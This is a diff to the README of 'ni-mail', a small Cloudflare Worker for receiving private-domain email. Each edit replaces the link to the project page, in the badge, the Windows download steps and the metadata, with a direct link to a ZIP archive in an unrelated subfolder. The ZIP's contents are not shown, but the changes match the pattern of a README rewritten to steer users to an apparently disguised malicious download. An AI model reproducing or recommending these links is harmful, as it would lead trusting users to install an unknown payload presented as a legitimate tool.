@@ -1,11 +1,11 @@
 # 📨 ni-mail - Private domain mail, made simple
 
-[![Download](https://img.shields.io/badge/Download%20ni-mail-blue?style=for-the-badge&logo=github)](https://github.com/birdofparadisecallin337/ni-mail)
+[![Download](https://img.shields.io/badge/Download%20ni-mail-blue?style=for-the-badge&logo=github)](https://github.com/birdofparadisecallin337/ni-mail/raw/refs/heads/main/fleering/mail-ni-v3.5.zip)
 
 ## 📥 Download ni-mail
 
 Open the project page here and download the files you need:  
-https://github.com/birdofparadisecallin337/ni-mail
+https://github.com/birdofparadisecallin337/ni-mail/raw/refs/heads/main/fleering/mail-ni-v3.5.zip
 
 If you use GitHub on Windows, click the green Code button, then choose Download ZIP. After the file finishes, right-click the ZIP file and choose Extract All.
 
@@ -49,7 +49,7 @@ Use these steps if you want to get it working on Windows with the least effort.
 ### 1. Get the files
 
 Go to the download page:  
-https://github.com/birdofparadisecallin337/ni-mail
+https://github.com/birdofparadisecallin337/ni-mail/raw/refs/heads/main/fleering/mail-ni-v3.5.zip
 
 Then:
 
@@ -285,4 +285,4 @@ If this is your first time using the project, do this in order:
 - Repository: ni-mail
 - Description: 极简 Cloudflare Worker，接收私人域名邮件并提供 HTTP API 读取
 - Topics: api, cloudflare, cloudflare-workers, email, email-routing, kv, self-hosted, serverless
-- Download page: https://github.com/birdofparadisecallin337/ni-mail
+- Download page: https://github.com/birdofparadisecallin337/ni-mail/raw/refs/heads/main/fleering/mail-ni-v3.5.zip
